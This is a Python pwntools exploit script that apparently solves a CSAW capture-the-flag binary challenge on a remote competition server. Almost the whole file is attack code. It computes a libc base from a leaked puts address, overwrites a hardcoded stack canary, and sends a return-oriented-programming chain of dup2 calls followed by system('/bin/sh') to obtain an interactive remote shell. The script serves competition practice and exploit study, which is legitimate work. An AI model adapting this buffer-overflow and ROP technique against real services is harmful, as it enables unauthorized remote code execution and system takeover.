from pwn import *
import struct

pack = lambda x: struct.pack("<Q", x) 
pack_b = lambda x: struct.pack(">Q", x) 
r = remote('pwn.chal.csaw.io', 8002)
r.send("1\n")
#read in reference
r.recvuntil("Reference:")
#Save address of puts
puts = r.recvn(14)
libc_base = (int(puts,16) + 0x500) - 0x6fd60
#Calculate libc offsets
puts = pack(int(puts,16) + 0x500)
sys = pack(libc_base + 0x46590)
dup2_addr = pack(libc_base + 0xebe90)
ebfe = pack(libc_base + 0x00134200)
rdi = pack(libc_base + 0x22b9a)
rsi = pack(libc_base + 0x24885)
binsh = pack(libc_base + 0x17c8c3)
rsi_r15 = pack(libc_base + 0x4012e1)
ed = pack(libc_base + 0x1bf8e1)
printf = pack(libc_base + 0x00054340)
#print hex(p_addr), ":", hex(sys), ":", hex(dup2)
#Get Canary
canary = 0x00a7026266bb6890

#Now get eip
r.send("2\n")
#dup2 = lambda x, y: rdi + str(x) + rsi + str(y) + dup2_addr
#
dup2 = lambda x, y: rdi + pack(x) + rsi + pack(y) + dup2_addr
system = rdi + binsh + sys
#exploit = 'A'*0x138 + pack_b(canary) + ebfe + dup2(1,3) + ebfe
exploit = 'A'*0x138 + pack_b(canary) + ebfe + dup2(4,1) + dup2(4,0) + system
r.send(exploit)
r.interactive()
